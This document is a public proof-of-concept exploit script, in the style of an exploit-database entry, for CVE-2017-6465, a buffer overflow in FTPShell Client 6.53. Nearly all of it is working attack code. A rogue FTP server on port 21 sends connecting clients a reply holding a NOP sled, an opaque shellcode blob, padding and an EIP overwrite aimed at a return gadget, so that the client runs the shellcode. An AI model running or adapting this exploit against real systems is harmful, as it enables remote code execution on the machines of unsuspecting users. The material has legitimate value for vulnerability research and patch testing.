# Exploit Title: FTPShell Client 6.53 buffer overflow on making initial connection
# Date: 2017-03-04
# Exploit Author: Peter Baris
# Vendor Homepage: http://www.saptech-erp.com.au
# Software Link: http://www.ftpshell.com/downloadclient.htm
# Version: Windows Server 2008 R2 x64
# Tested on: Windows Server 2008 R2 Standard x64
# CVE: CVE-2017-6465

# 2017-03-04: Software vendor notified
# 2017-03-06: No reply
# 2017-03-06: Publishing

import socket
import sys

shell=("\xbe\x2f\xbf\x84\xe5\xda\xd4\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x52\x31\x72\x12\x03\x72\x12\x83\xed\xbb\x66\x10\x0d\x2b\xe4"
"\xdb\xed\xac\x89\x52\x08\x9d\x89\x01\x59\x8e\x39\x41\x0f\x23"
"\xb1\x07\xbb\xb0\xb7\x8f\xcc\x71\x7d\xf6\xe3\x82\x2e\xca\x62"
"\x01\x2d\x1f\x44\x38\xfe\x52\x85\x7d\xe3\x9f\xd7\xd6\x6f\x0d"
"\xc7\x53\x25\x8e\x6c\x2f\xab\x96\x91\xf8\xca\xb7\x04\x72\x95"
"\x17\xa7\x57\xad\x11\xbf\xb4\x88\xe8\x34\x0e\x66\xeb\x9c\x5e"
"\x87\x40\xe1\x6e\x7a\x98\x26\x48\x65\xef\x5e\xaa\x18\xe8\xa5"
"\xd0\xc6\x7d\x3d\x72\x8c\x26\x99\x82\x41\xb0\x6a\x88\x2e\xb6"
"\x34\x8d\xb1\x1b\x4f\xa9\x3a\x9a\x9f\x3b\x78\xb9\x3b\x67\xda"
"\xa0\x1a\xcd\x8d\xdd\x7c\xae\x72\x78\xf7\x43\x66\xf1\x5a\x0c"
"\x4b\x38\x64\xcc\xc3\x4b\x17\xfe\x4c\xe0\xbf\xb2\x05\x2e\x38"
"\xb4\x3f\x96\xd6\x4b\xc0\xe7\xff\x8f\x94\xb7\x97\x26\x95\x53"
"\x67\xc6\x40\xf3\x37\x68\x3b\xb4\xe7\xc8\xeb\x5c\xed\xc6\xd4"
"\x7d\x0e\x0d\x7d\x17\xf5\xc6\x42\x40\x3d\x17\x2b\x93\xbd\x09"
"\xf7\x1a\x5b\x43\x17\x4b\xf4\xfc\x8e\xd6\x8e\x9d\x4f\xcd\xeb"
"\x9e\xc4\xe2\x0c\x50\x2d\x8e\x1e\x05\xdd\xc5\x7c\x80\xe2\xf3"
"\xe8\x4e\x70\x98\xe8\x19\x69\x37\xbf\x4e\x5f\x4e\x55\x63\xc6"
"\xf8\x4b\x7e\x9e\xc3\xcf\xa5\x63\xcd\xce\x28\xdf\xe9\xc0\xf4"
"\xe0\xb5\xb4\xa8\xb6\x63\x62\x0f\x61\xc2\xdc\xd9\xde\x8c\x88"
"\x9c\x2c\x0f\xce\xa0\x78\xf9\x2e\x10\xd5\xbc\x51\x9d\xb1\x48"
"\x2a\xc3\x21\xb6\xe1\x47\x51\xfd\xab\xee\xfa\x58\x3e\xb3\x66"
"\x5b\x95\xf0\x9e\xd8\x1f\x89\x64\xc0\x6a\x8c\x21\x46\x87\xfc"
"\x3a\x23\xa7\x53\x3a\x66")

port = 21

try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("0.0.0.0", port))
        s.listen(5)
        print("[i] FTP server started on port: "+str(port)+"\r\n")
except:
        print("[!] Failed to bind the server to port: "+str(port)+"\r\n")



# 004b95dc in ftpshell.exe PUSH ESI ; RETN
eip = "\xdc\x95\x4b"
nops = "\x90"*8 
junk = "A"*(400-len(nops)-len(shell))
buffer = nops + shell + junk + eip

while True:
    conn, addr = s.accept()
    conn.send('220 Welcome to your unfriendly FTP server\r\n')
    print(conn.recv(1024))
    conn.send("331 OK\r\n")
    print(conn.recv(1024))
    conn.send('230 OK\r\n')
    print(conn.recv(1024))
    conn.send('220 "'+buffer+'" is current directory\r\n')
